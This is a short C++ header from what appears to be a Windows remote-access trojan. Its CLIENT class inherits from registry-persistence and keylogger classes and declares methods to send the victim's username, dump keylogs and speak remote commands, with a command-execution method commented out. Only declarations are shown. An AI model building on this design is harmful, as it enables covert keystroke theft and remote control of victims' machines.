#pragma once
#include <WS2tcpip.h>
#include <string>
#include "persistence.h"
#include "keylogger.h"
#include <sapi.h>
using namespace std;

class CLIENT : public Registry, public Keylogger
{
public:
	void send_username();
	void speak_command(string& data);
	void dump_keylogs();
	//void execute(string& command);
};